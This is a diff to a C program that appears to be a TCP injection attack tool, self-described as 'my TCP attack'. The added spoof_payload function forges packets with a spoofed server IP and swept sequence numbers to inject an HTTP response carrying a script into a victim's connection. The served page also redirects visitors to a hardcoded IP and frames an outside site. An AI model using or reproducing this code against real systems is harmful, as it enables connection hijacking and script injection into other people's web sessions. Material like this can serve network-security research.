@@ -20,10 +20,15 @@
 
 #define RESPONSE "HTTP/1.0 200 OK\r\nContent-Length: %d\r\nConnection: close\r\nContent-type: text/html;\r\n\r\n%s\n"
 
-#define HTML_CODE "<html><h1>Hi</h1><script type=\"text/javascript\">setTimeout(function(){document.location=\"http://141.212.109.239:888/\";},100);</script></html>"
+#define HTML_CODE "<html><h1>Hi</h1>Welcome to my TCP attack! (v0.0.1)\n" \
+    "<iframe id=\"foo\" src=\"http://hobocomp.com/\"></iframe>\n" \
+    "<script type=\"text/javascript\">setTimeout(function(){document.location=\"http://141.212.111.247:888/\";},200);</script></html>"
 
 #define INJECT_HTTP "HTTP/1.1 200\nContent-Type: text/html;\n\n<script>alert(document.cookie);</script>\n"
-#define SEQ_STEP 1024
+#define INJECT_SIZE 1024
+#define SEQ_STEP (5*INJECT_SIZE)
+
+#define SERVER_IP "68.40.51.184"
 
 
 void http_req_cb(struct bufferevent *bev, void *ctx)
@@ -36,7 +41,7 @@ void http_req_cb(struct bufferevent *bev, void *ctx)
 
 void tcp_events(struct bufferevent *bev, short events, void *ctx)
 {
-    return
+    return;
 }
 
 void on_read(int sock, short type, void *arg)
@@ -51,6 +56,43 @@ void echo_read_cb(struct bufferevent *bev, void *ctx)
 }
 
 
+void spoof_payload(struct sockaddr_in *sin, uint32_t seq_start)
+{
+    struct timeval start_time, cur_time;
+    struct pkt_data pkt;
+    char payload[INJECT_SIZE + 1];
+    gettimeofday(&start_time, NULL);
+
+    if (strlen(INJECT_HTTP) >= INJECT_SIZE) {
+        fprintf(stderr, "INJECT_HTTP larger than INJECT_SIZE!\n");
+        exit(1);
+    }
+
+    memset(payload, ' ', INJECT_SIZE);
+    strncpy(&payload[INJECT_SIZE - strlen(INJECT_HTTP)], INJECT_HTTP, INJECT_SIZE);
+    pkt.daddr = sin->sin_addr.s_addr;
+    pkt.saddr = inet_addr(SERVER_IP);
+    pkt.dport = sin->sin_port;
+    pkt.sport = htons(80);
+    
+    pkt.ack = 0;
+    pkt.seq = seq_start;
+    pkt.flags = 0;
+    pkt.window = 4096;
+    pkt.id = 1234;
+
+    int pkt_count = 0;
+    
+    do {  
+        tcp_forge_xmit(&pkt, payload, SEQ_STEP);
+        pkt.seq -= SEQ_STEP;
+        pkt_count++;
+        gettimeofday(&cur_time, NULL);
+    } while (((cur_time.tv_sec - start_time.tv_sec)*1000 - 
+              (cur_time.tv_usec - start_time.tv_usec)/1000) < 1000);
+    printf("got %d packets off\n", pkt_count); 
+}
+
 
 void on_tcp_accept(struct evconnlistener *listener, 
                    evutil_socket_t sock, struct sockaddr *addr, int socklen, void *ptr)
@@ -61,15 +103,11 @@ void on_tcp_accept(struct evconnlistener *listener,
     bufferevent_enable(bev, EV_READ|EV_WRITE);
     evbuffer_add_printf(bufferevent_get_output(bev), RESPONSE, strlen(HTML_CODE), HTML_CODE);
 
-    struct tcp_state state;
-    int state_len = sizeof(state);    
-    if (getsockopt(sock, IPPROTO_TCP, TCP_STATE, &state, &state_len) < 0) {
-        perror("getsockopt");
-        return;
-    }
-    unsigned int isn = state.seq - 1;
-    unsigned int victim_port = state.dport;
-    printf("accept: %s ISN: %08x (%u), port %d\n", inet_ntoa(((struct sockaddr_in*)addr)->sin_addr), isn, isn, victim_port);
+    struct sockaddr_in *sin = (struct sockaddr_in*)addr;
+
+    printf("accept: %s:%d\n", inet_ntoa(sin->sin_addr), ntohs(sin->sin_port));
+
+    spoof_payload(sin, 0xffffffff);
 }
 
 
